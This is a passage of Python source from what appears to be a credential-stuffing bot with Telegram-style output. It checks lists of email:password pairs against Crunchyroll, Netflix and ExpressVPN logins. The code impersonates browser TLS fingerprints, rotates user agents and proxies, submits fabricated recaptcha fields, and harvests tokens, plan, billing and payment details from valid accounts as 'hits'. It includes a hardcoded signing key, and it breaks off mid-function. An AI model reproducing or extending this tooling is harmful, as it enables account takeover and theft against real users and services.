def cr2_check_one(email: str, password: str, proxy: Optional[str] = None, token_only: bool = False) -> Dict:
    session = cr2_build_session(proxy)
    try:
        body_obj = {"email": email, "password": password,
                    "recaptchaToken": "", "eventSettings": {}}
        body_bytes = json.dumps(body_obj, separators=(",", ":")).encode("utf-8")
        try:
            r = session.post(CR2_LOGIN_URL, data=body_bytes,
                             headers=cr2_build_headers(body_bytes),
                             timeout=12, verify=False)
        except Exception as e:
            return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}

        kind, note = cr2_classify(r.status_code, r.text)

        if kind in ("INVALID", "MFA", "CAP", "ERR"):
            return {"status": kind, "reason": note, "email": email, "password": password}

        if kind != "VALID":
            return {"status": "ERR", "reason": f"unexpected_{kind}", "email": email, "password": password}

        tier, ev = "UNKNOWN", ""
        token = ""
        try:
            token = cr2_get_access_token(session)
            if token or not token_only:
                tier, ev, _ = cr2_probe_account(session, token)
        except Exception as e:
            tier, ev = "UNKNOWN", f"premium check error: {str(e)[:40]}"

        if token_only:
            return {
                "status":   "VALID",
                "email":    email,
                "password": password,
                "tier":     tier,
                "token":    token,
                "content":  f"{email}:{password} | Tier = {tier} | Token = {token}",
            }

        return {
            "status":   tier if tier in ("PREMIUM", "FREE") else "VALID",
            "email":    email,
            "password": password,
            "tier":     tier,
            "evidence": ev,
            "token":    token,
            "content":  f"{email}:{password} | Tier = {tier} ({ev}) | Token = {token}",
        }

    except Exception as e:
        return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}


def cr2_fmt_hit(r: dict) -> str:
    tier = r.get("tier", "VALID")
    icon = CR_PREMIUM if tier == "PREMIUM" else CR_FREE
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {icon} <b>CRUNCHYROLL 2 HIT</b>        ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{icon}  <b>Tier     :</b> <code>{tier}</code>\n"
        f"{CR_TOKEN}  <b>Token    :</b> <code>{r.get('token','N/A')[:60]}…</code>"
    )


def cr2_fmt_progress(done: int, total: int, premium: int, free: int, valid: int, invalid: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Crunchyroll 2</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{CR_PREMIUM} Premium : <b>{premium}</b>\n"
        f"{CR_FREE} Free    : <b>{free}</b>\n"
        f"{CR_PREMIUM} Valid   : <b>{valid}</b>\n"
        f"{CR_FAIL} Invalid : <b>{invalid}</b>"
    )


def cr2_fmt_summary(total: int, premium: int, free: int, valid: int, invalid: int,
                    mfa: int, elapsed: float) -> str:
    pct = f"{premium / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Crunchyroll 2 Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total   : <b>{total}</b>\n"
        f"{CR_PREMIUM} Premium : <b>{premium}</b>  (<i>{pct}%</i>)\n"
        f"{CR_FREE} Free    : <b>{free}</b>\n"
        f"{CR_PREMIUM} Valid   : <b>{valid}</b>\n"
        f"{CR_FAIL} Invalid : <b>{invalid}</b>\n"
        f"{MSFC_2FA} MFA     : <b>{mfa}</b>\n"
        f"{E_CLOCK} Time    : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    NETFLIX CAP (GraphQL) — FIXED                        ║
# ║  BUG FIX: curl_cffi required (loud fail if missing)                     ║
# ╚══════════════════════════════════════════════════════════════════════════╝

NFC_GRAPHQL_URL = "https://web.prod.cloud.netflix.com/graphql"
NFC_PERSISTED_ID = "9291ac91-c2b6-4610-bd19-ec0555d965c4"
NFC_PQ_VERSION = 102
NFC_MAX_RETRY = 3
NFC_TIMEOUT_GQL = 35
NFC_TIMEOUT_PAGE = 45
NFC_TIMEOUT_INFO = 25

NFC_LANG_MAP = {
    'BR':'pt','PT':'pt','US':'en','GB':'en','AU':'en','CA':'en','IE':'en','NZ':'en','ZA':'en',
    'TR':'tr','DE':'de','FR':'fr','ES':'es','IT':'it','JP':'ja','KR':'ko','CN':'zh','RU':'ru',
    'IN':'hi','MX':'es','AR':'es','SA':'ar','AE':'ar','EG':'ar',
}

NFC_PHONE_CODES = {
    "US":"1","GB":"44","IN":"91","CA":"1","AU":"61","DE":"49","FR":"33",
    "BR":"55","MX":"52","JP":"81","KR":"82","TR":"90","SA":"966","AE":"971",
}

NFC_CHROME_PROFILES = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
     "sec": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
     "pf": "chrome124", "plat": '"Windows"'},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
     "sec": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
     "pf": "chrome124", "plat": '"macOS"'},
]

NFC_NEVER_TIDS = frozenset({
    'registration-consent', 'email-consent', 'name-input',
    'signupform', 'sign-up', 'field-firstName', 'continue-reg'})
NFC_FREE_TIDS = frozenset({
    'plan-context-page-container', 'signupContextContainer', 'plan-selection-title'})
NFC_FREE_KW = (
    'choose your plan', 'choose a plan', 'pick a plan',
    'rejoin', 'restart netflix', 'reactivat',
    'resume your membership', 'come back to netflix',
    'restart your membership', 'sent a rejoin link')
NFC_OTP_TIDS = frozenset({
    'collect-otp', 'pin-entry', 'resend-code-text',
    'authentication-link-sent', 'magic-link'})
NFC_CUSTOM_KW = (
    'bağlantıya dokunun', 'kodu girin', 'kod gönderdik',
    'link sent', 'code sent', 'check your email',
    'check your inbox', 'enviamos um', 'we sent',
    'we emailed', 'authentication link')
NFC_LOGIN_OK = (
    'circle-checkmark', 'navigating to /browse', 'universal":"/browse',
    'authflow-post-login', 'profile-gate', 'whoIsWatching',
    'who-is-watching', 'manage-profiles', '"ProfilesGate"',
    'switchProfile', 'prefetch":"/browse', '"path":"/browse')
NFC_TRANSIENT = (
    'something went wrong', 'please try again in a few minutes',
    'try again later', 'service is temporarily unavailable',
    'unexpected error', 'an error has occurred', 'server error')
NFC_BAD_KW = (
    'incorrect password', 'wrong password', 'invalid password',
    'password is incorrect', 'incorrect email or password',
    'email or password you entered is incorrect')


def nfc_pick_profile():
    return random.choice(NFC_CHROME_PROFILES)


def nfc_between(t: str, l: str, r: str) -> Optional[str]:
    i = t.find(l)
    if i < 0: return None
    i += len(l)
    j = t.find(r, i)
    return t[i:j] if j >= 0 else None


def nfc_unescape(s: str) -> str:
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    return s


def nfc_extract_tokens(html: str, url: str) -> Tuple[Optional[str], Optional[str], str]:
    ss = su = None
    if 'serverState=' in url:
        qs = urlparse(url).query
        ss = parse_qs(qs).get('serverState', [None])[0]
    if not ss:
        for pat in ['"serverState":"', 'serverState%22%3A%22', '"serverState" : "', 'serverState\\":\\"']:
            v = nfc_between(html, pat, '"')
            if v and len(v) > 20 and not v.startswith('{'):
                ss = nfc_unescape(v)
                break
    if not ss:
        m = re.search(r'serverState["\s:%]+([A-Za-z0-9+/=_\-]{30,})', html)
        if m:
            ss = m.group(1)
    v = nfc_between(html, '"serverScreenUpdate":"', '"')
    if v and len(v) > 20:
        su = nfc_unescape(v)
    m = re.search(r'uiVersion["\s:]+["\']?(v[a-f0-9]{6,})', html)
    av = m.group(1) if m else 'v647f4d35'
    return ss, su, av


def nfc_get_nstate(text: str) -> Optional[str]:
    try:
        return json.loads(text).get("data", {}).get("result", {}).get("screen", {}).get("serverState")
    except Exception:
        return None


def nfc_get_subcmds(text: str) -> List[str]:
    out = []
    def walk(o, d=0):
        if d > 20: return
        if isinstance(o, dict):
            if (o.get("__typename") == "CLCSRequestScreenUpdate"
                    and o.get("loggingCommand") == "SubmitCommand"
                    and o.get("serverScreenUpdate")):
                out.append(o["serverScreenUpdate"])
            for v in o.values():
                walk(v, d + 1)
        elif isinstance(o, list):
            for i in o:
                walk(i, d + 1)
    try:
        walk(json.loads(text))
    except Exception:
        pass
    return out


def nfc_get_tids(text: str) -> Set[str]:
    r = set()
    def walk(o, d=0):
        if d > 20: return
        if isinstance(o, dict):
            tid = o.get("testId")
            if tid:
                r.add(tid)
            for v in o.values():
                walk(v, d + 1)
        elif isinstance(o, list):
            for i in o:
                walk(i, d + 1)
    try:
        walk(json.loads(text))
    except Exception:
        pass
    return r


def nfc_get_texts(text: str) -> List[str]:
    r = []
    def walk(o, d=0):
        if d > 20: return
        if isinstance(o, dict):
            pc = o.get("plainContent")
            if isinstance(pc, dict) and pc.get("value"):
                r.append(pc["value"])
            wt = o.get("webTextWithTags")
            if isinstance(wt, dict):
                tx = wt.get("text") or {}
                if isinstance(tx, dict) and tx.get("value"):
                    r.append(tx["value"])
            for v in o.values():
                walk(v, d + 1)
        elif isinstance(o, list):
            for i in o:
                walk(i, d + 1)
    try:
        walk(json.loads(text))
    except Exception:
        pass
    return r


def nfc_session(proxy: Optional[str] = None, pf: str = "chrome124"):
    """FIX: requires curl_cffi. Silent fallback removed — fails loud."""
    if not _CURL_CFFI_OK:
        raise RuntimeError("curl_cffi_required: Netflix Cap needs curl_cffi for TLS impersonation. "
                           "Install: pip install curl-cffi")
    sess = creq.Session(impersonate=pf)
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    return sess


def nfc_gql(sess, ss, su, fields, av, country, lowcode, ua, sec, plat) -> str:
    lang = NFC_LANG_MAP.get(country.upper(), 'en')
    loc = f'{lang}-{country.upper()}'
    h = {
        'x-netflix.request.id': str(uuid.uuid4()).replace('-', ''),
        'x-netflix.context.operation-name': 'CLCSScreenUpdate',
        'x-netflix.request.originating.url': f'https://www.netflix.com/{lowcode}/login',
        'x-netflix.context.app-version': av,
        'x-netflix.request.clcs.bucket': 'high',
        'x-netflix.context.locales': loc.lower(),
        'x-netflix.context.ui-flavor': 'akira',
        'x-netflix.request.toplevel.uuid': str(uuid.uuid4()),
        'x-netflix.request.attempt': '1',
        'x-netflix.request.client.context': '{"appstate":"foreground"}',
        'accept': '*/*',
        'content-type': 'application/json',
        'accept-language': f'{loc},{lang};q=0.9,en;q=0.8',
        'user-agent': ua,
        'origin': 'https://www.netflix.com',
        'referer': 'https://www.netflix.com/',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'sec-ch-ua': sec,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': plat,
    }
    body = {
        "operationName": "CLCSScreenUpdate",
        "variables": {
            "format": "HTML", "imageFormat": "PNG", "locale": loc,
            "serverState": ss, "serverScreenUpdate": su or "",
            "inputFields": fields,
        },
        "extensions": {"persistedQuery": {"id": NFC_PERSISTED_ID, "version": NFC_PQ_VERSION}}
    }
    r = sess.post(NFC_GRAPHQL_URL, headers=h, json=body, timeout=NFC_TIMEOUT_GQL)
    return r.text


def nfc_verify_account(sess, ua: str, country: str) -> Optional[Dict]:
    lang = NFC_LANG_MAP.get(country.upper(), 'en')
    loc = f'{lang}-{country.upper()}'
    info = {}
    try:
        r = sess.get('https://www.netflix.com/youraccount', headers={
            'accept': 'text/html,application/xhtml+xml',
            'accept-language': f'{loc},{lang};q=0.9,en;q=0.8',
            'user-agent': ua,
        }, timeout=NFC_TIMEOUT_INFO)
        html = r.text
    except Exception:
        return None

    for key, left, right in [
        ('Plan',       '"localizedPlanName":{"fieldType":"String","value":"',   '"'),
        ('Country',    '"currentCountry":"',                                     '"'),
        ('MaxStreams', '"maxStreams":{"fieldType":"Numeric","value":',            '},'),
        ('NextBill',   '"nextBillingDate":{"fieldType":"String","value":"',      '"'),
        ('Payment',    '"paymentMethod":{"fieldType":"String","value":"',        '"'),
        ('Since',      '"memberSince":"',                                        '",'),
        ('Quality',    '"videoQuality":{"fieldType":"String","value":"',         '"'),
    ]:
        v = nfc_between(html, left, right)
        if v:
            info[key] = nfc_unescape(v.strip())

    m = re.search(r'"numProfiles"\s*:\s*(\d+)', html)
    if m: info['Profiles'] = m.group(1)
    m = re.search(r'"extraMemberCount"\s*:\s*(\d+)', html)
    if m and m.group(1) != '0': info['Extra'] = m.group(1)

    has_plan = bool(info.get('Plan'))
    has_bill = bool(info.get('NextBill'))
    info['_active'] = has_plan and has_bill

    if not info.get('_active'):
        if '"currentMemberStatus":"CURRENT_MEMBER"' in html:
            info['_active'] = True

    return info


def nfc_fmt_info(info: Dict) -> str:
    skip = {'_active'}
    parts = [f"{k}: {v}" for k, v in info.items() if k not in skip and v]
    return ' | '.join(parts) if parts else 'Login OK'


def nfc_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    """GraphQL login. Requires curl_cffi (fixed)."""
    if not _CURL_CFFI_OK:
        return {"status": "DEAD", "reason": "curl_cffi_required", "email": email, "password": password}

    ch = nfc_pick_profile()
    ua, sec, pf, plat = ch['ua'], ch['sec'], ch['pf'], ch['plat']
    country = "US"
    lowcode = "us"
    cc = NFC_PHONE_CODES.get(country, "1")

    for attempt in range(NFC_MAX_RETRY):
        try:
            sess = nfc_session(proxy, pf)

            try:
                page = sess.get(f'https://www.netflix.com/{lowcode}/login', headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': f'en-{country},{NFC_LANG_MAP.get(country, "en")};q=0.9',
                    'user-agent': ua,
                }, timeout=NFC_TIMEOUT_PAGE, allow_redirects=True)
            except Exception as e:
                if attempt < NFC_MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 4))
                    continue
                return {"status": "RETRY", "reason": f"page_fetch_{type(e).__name__}", "email": email, "password": password}

            ss, su, av = nfc_extract_tokens(page.text, page.url)
            if not ss:
                if attempt < NFC_MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 4))
                    continue
                return {"status": "RETRY", "reason": "no_server_state", "email": email, "password": password}

            try:
                r1 = nfc_gql(sess, ss, su or '', [
                    {"name": "userLoginId", "value": {"stringValue": email}},
                    {"name": "countryCode", "value": {"stringValue": cc}},
                    {"name": "countryIsoCode", "value": {"stringValue": country}},
                    {"name": "recaptchaError", "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
                    {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(1200, 3000)}},
                ], av, country, lowcode, ua, sec, plat)
            except Exception as e:
                if attempt < NFC_MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 4))
                    continue
                return {"status": "RETRY", "reason": f"gql_email_{type(e).__name__}", "email": email, "password": password}

            ns1 = nfc_get_nstate(r1)
            cmds1 = nfc_get_subcmds(r1)
            tids1 = nfc_get_tids(r1)
            txts1 = ' '.join(nfc_get_texts(r1)).lower()

            if not ns1:
                if attempt < NFC_MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 4))
                    continue
                return {"status": "RETRY", "reason": "email_step_no_state", "email": email, "password": password}

            if tids1 & NFC_NEVER_TIDS:
                return {"status": "FREE", "reason": "Never Member", "email": email, "password": password}

            if (tids1 & NFC_FREE_TIDS) or any(k in txts1 for k in NFC_FREE_KW):
                return {"status": "FREE", "reason": "Former Member", "email": email, "password": password}

            is_otp = bool(tids1 & NFC_OTP_TIDS) or any(k in txts1 for k in NFC_CUSTOM_KW)
            if is_otp and 'usePasswordInsteadHelpMenuItem' not in tids1:
                txt = next((t for t in nfc_get_texts(r1) if len(t) > 5), 'Email Code Only')
                return {"status": "CUSTOM", "reason": txt[:80], "email": email, "password": password}

            pw_state, pw_cmds = ns1, cmds1
            if 'password-input' not in tids1:
                pw_su = cmds1[-1] if cmds1 else ''
                r1b = nfc_gql(sess, ns1, pw_su, [], av, country, lowcode, ua, sec, plat)
                ns1b = nfc_get_nstate(r1b)
                cmds1b = nfc_get_subcmds(r1b)
                tids1b = nfc_get_tids(r1b)
                if ns1b and 'password-input' in tids1b:
                    pw_state, pw_cmds = ns1b, cmds1b
                elif ns1b:
                    tids1b_otp = bool(tids1b & NFC_OTP_TIDS)
                    txts1b_low = ' '.join(nfc_get_texts(r1b)).lower()
                    if tids1b_otp or any(k in txts1b_low for k in NFC_CUSTOM_KW):
                        txt = next((t for t in nfc_get_texts(r1b) if len(t) > 5), 'Email Code Only')
                        return {"status": "CUSTOM", "reason": txt[:80], "email": email, "password": password}
                    pw_state, pw_cmds = ns1b, cmds1b
                else:
                    if is_otp:
                        txt = next((t for t in nfc_get_texts(r1) if len(t) > 5), 'Email Code Only')
                        return {"status": "CUSTOM", "reason": txt[:80], "email": email, "password": password}
                    if attempt < NFC_MAX_RETRY - 1:
                        time.sleep(random.uniform(3, 7))
                        continue
                    return {"status": "RETRY", "reason": "step1b_error", "email": email, "password": password}

            pw_su2 = pw_cmds[1] if len(pw_cmds) > 1 else (pw_cmds[0] if pw_cmds else '')
            r2 = nfc_gql(sess, pw_state, pw_su2, [
                {"name": "password", "value": {"stringValue": password}},
                {"name": "userLoginId", "value": {"stringValue": email}},
                {"name": "countryCode", "value": {"stringValue": cc}},
                {"name": "countryIsoCode", "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(300, 800)}},
                {"name": "recaptchaError", "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
            ], av, country, lowcode, ua, sec, plat)

            low2 = r2.lower()
            tids2 = nfc_get_tids(r2)
            txts2 = ' '.join(nfc_get_texts(r2)).lower()

            if (tids2 & NFC_OTP_TIDS) or any(k in txts2 for k in NFC_CUSTOM_KW):
                if not ('password-input' in tids2 and 'sign-in-button' in tids2):
                    txt = next((t for t in nfc_get_texts(r2) if len(t) > 5), 'Email Code Only')
                    return {"status": "CUSTOM", "reason": txt[:80], "email": email, "password": password}

            login_ok = any(sig in r2 or sig in low2 for sig in NFC_LOGIN_OK)
            if login_ok:
                info = nfc_verify_account(sess, ua, country)
                if info and info.get('_active'):
                    return {
                        "status": "HIT", "email": email, "password": password,
                        "plan": info.get('Plan', 'Unknown'),
                        "country": info.get('Country', 'Unknown'),
                        "max_streams": info.get('MaxStreams', 'Unknown'),
                        "next_bill": info.get('NextBill', 'Unknown'),
                        "payment": info.get('Payment', 'Unknown'),
                        "since": info.get('Since', 'Unknown'),
                        "quality": info.get('Quality', 'Unknown'),
                        "profiles": info.get('Profiles', 'Unknown'),
                        "content": f"{email}:{password} | {nfc_fmt_info(info)}",
                    }
                elif info is not None:
                    detail = 'Former Member'
                    if info.get('Country'):
                        detail += f" | {info['Country']}"
                    return {"status": "FREE", "reason": detail, "email": email, "password": password}
                else:
                    return {"status": "HIT", "email": email, "password": password,
                            "plan": "Unknown", "country": "Unknown",
                            "content": f"{email}:{password} | Login OK (verify timeout)"}

            if any(kw in txts2 for kw in NFC_TRANSIENT):
                if attempt < NFC_MAX_RETRY - 1:
                    time.sleep(random.uniform(3, 7))
                    continue
                return {"status": "RETRY", "reason": "transient_server_error", "email": email, "password": password}

            if (tids2 & NFC_FREE_TIDS) or any(kw in txts2 for kw in NFC_FREE_KW):
                return {"status": "FREE", "reason": "Former Member", "email": email, "password": password}

            if tids2 & NFC_NEVER_TIDS:
                return {"status": "FREE", "reason": "Never Member", "email": email, "password": password}

            if any(kw in low2 or kw in txts2 for kw in NFC_BAD_KW):
                return {"status": "BAD", "reason": "bad_password", "email": email, "password": password}

            if 'password-input' in tids2 and 'sign-in-button' in tids2:
                return {"status": "BAD", "reason": "bad_password", "email": email, "password": password}

            if attempt < NFC_MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5) * (attempt + 1))
                continue
            return {"status": "RETRY", "reason": "ambiguous", "email": email, "password": password}

        except Exception as e:
            err = str(e).lower()
            if "curl_cffi_required" in err:
                return {"status": "DEAD", "reason": "curl_cffi_required", "email": email, "password": password}
            if any(x in err for x in ("recv failure", "connection", "timeout", "proxy", "ssl")):
                if attempt < NFC_MAX_RETRY - 1:
                    time.sleep(random.uniform(1, 3))
                    continue
            if attempt < NFC_MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5) * (attempt + 1))
                continue
            return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}

    return {"status": "RETRY", "reason": "max_retries", "email": email, "password": password}


def nfc_fmt_hit(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {SP_PREMIUM} <b>NETFLIX CAP HIT</b>         ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_PLAN}  <b>Plan     :</b> <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_COUNTRY}  <b>Country  :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{SP_BOLT}  <b>Quality  :</b> <code>{r.get('quality','Unknown')}</code>\n"
        f"{E_COUNT}  <b>Streams  :</b> <code>{r.get('max_streams','Unknown')}</code>\n"
        f"{E_COUNT}  <b>Profiles :</b> <code>{r.get('profiles','Unknown')}</code>\n"
        f"{E_DATE}  <b>Billing  :</b> <code>{r.get('next_bill','Unknown')}</code>\n"
        f"{MSFC_CARD}  <b>Payment  :</b> <code>{r.get('payment','Unknown')}</code>\n"
        f"{E_DATE}  <b>Since    :</b> <code>{r.get('since','Unknown')}</code>"
    )


def nfc_fmt_progress(done: int, total: int, hit: int, free: int, bad: int, tfa: int, custom: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Netflix Cap</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{SP_PREMIUM} Hit    : <b>{hit}</b>\n"
        f"{SP_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{MSFC_2FA} 2FA    : <b>{tfa}</b>\n"
        f"{CR_RETRY} Custom : <b>{custom}</b>"
    )


def nfc_fmt_summary(total: int, hit: int, free: int, bad: int, tfa: int, custom: int, elapsed: float) -> str:
    pct = f"{hit / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Netflix Cap Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total  : <b>{total}</b>\n"
        f"{SP_PREMIUM} Hit    : <b>{hit}</b>  (<i>{pct}%</i>)\n"
        f"{SP_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{MSFC_2FA} 2FA    : <b>{tfa}</b>\n"
        f"{CR_RETRY} Custom : <b>{custom}</b>\n"
        f"{E_CLOCK} Time   : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ▼ CHUNK 5 END — PASTE CHUNK 6 BELOW THIS LINE ▼
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    EXPRESSVPN ENGINE                                    ║
# ╚══════════════════════════════════════════════════════════════════════════╝

EX_DEV_BY = "@klenxz"
EX_HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
EX_CERT_BASE64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRl"
    "MSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYD"
    "VQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG"
    "9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP"
    "7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2"
    "DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxo"
    "YDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoag"
    "A0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ"
    "sFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHpp"
    "zzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlY"
    "Q70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+"
    "PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
)


def ex_get_byte_array(size: int) -> bytes:
    if _PYCRYPTODOME_OK:
        return get_random_bytes(size)
    return secrets.token_bytes(size)


def ex_generate_random_string(length: int = 64) -> str:
    return "".join(random.choices(string.hexdigits.lower(), k=length))


def ex_unix_time_to_date(unix_time) -> str:
    try:
        return datetime.fromtimestamp(int(unix_time)).strftime("%Y-%m-%d")
    except Exception:
        return "Unknown"


def ex_aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(data)
    padding_length = decrypted[-1]
    return decrypted[:-padding_length]


def ex_gzip_data(input_string: str) -> bytes:
    input_bytes = input_string.encode("ascii")
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as gz:
        gz.write(input_bytes)
    return out.getvalue()


def ex_compute_signature(input_data: bytes, key: bytes) -> str:
    sig = hmac.new(key, input_data, hashlib.sha1).digest()
    return base64.b64encode(sig).decode("ascii")


def ex_envelope_encrypt(input_data: bytes, certificate: bytes) -> bytes:
    if not (_PYCRYPTODOME_OK and _ASN1CRYPTO_OK):
        raise RuntimeError("pycryptodome + asn1crypto required for ExpressVPN")

    cert = x509.Certificate.load(certificate)
    issuer = cert.issuer
    serial_number = cert.serial_number
    public_key_info = cert.public_key

    if hasattr(public_key_info, "parsed"):
        rsa_public_key = public_key_info.parsed
    else:
        rsa_public_key = keys.RSAPublicKey.load(public_key_info["public_key"].parsed.dump())

    modulus = rsa_public_key["modulus"].native
    public_exponent = rsa_public_key["public_exponent"].native
    rsa_key = RSA.construct((modulus, public_exponent))

    content_key = ex_get_byte_array(24)
    content_iv = ex_get_byte_array(8)

    pad_length = 8 - (len(input_data) % 8)
    if pad_length == 0:
        pad_length = 8
    padded_data = input_data + bytes([pad_length] * pad_length)

    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
    encrypted_content = cipher.encrypt(padded_data)

    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(content_key)

    recipient_id = cms.IssuerAndSerialNumber({
        "issuer": issuer, "serial_number": serial_number,
    })
    key_trans_recipient = cms.KeyTransRecipientInfo({
        "version": 0,
        "rid": cms.RecipientIdentifier(name="issuer_and_serial_number", value=recipient_id),
        "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({"algorithm": "1.2.840.113549.1.1.1"}),
        "encrypted_key": cms.OctetString(encrypted_key),
    })
    recipient_infos = cms.RecipientInfos([
        cms.RecipientInfo(name="ktri", value=key_trans_recipient)
    ])
    encrypted_content_info = cms.EncryptedContentInfo({
        "content_type": "1.2.840.113549.1.7.1",
        "content_encryption_algorithm": cms.EncryptionAlgorithm({
            "algorithm": "1.2.840.113549.3.7",
            "parameters": cms.OctetString(content_iv),
        }),
        "encrypted_content": encrypted_content,
    })
    enveloped_data = cms.EnvelopedData({
        "version": 0,
        "recipient_infos": recipient_infos,
        "encrypted_content_info": encrypted_content_info,
    })
    content_info = cms.ContentInfo({
        "content_type": "1.2.840.113549.1.7.3",
        "content": enveloped_data,
    })
    return content_info.dump()


def _ex_build_content(account_data: Dict) -> str:
    return (
        f"{account_data['email']}:{account_data['password']} | "
        f"OVPNUsername = {account_data.get('ovpn_username') or 'N/A'} | "
        f"OVPNPassword = {account_data.get('ovpn_password') or 'N/A'} | "
        f"PPTPUsername = {account_data.get('pptp_username') or 'N/A'} | "
        f"PPTPPassword = {account_data.get('pptp_password') or 'N/A'} | "
        f"Plan = {account_data.get('plan') or 'N/A'} | "
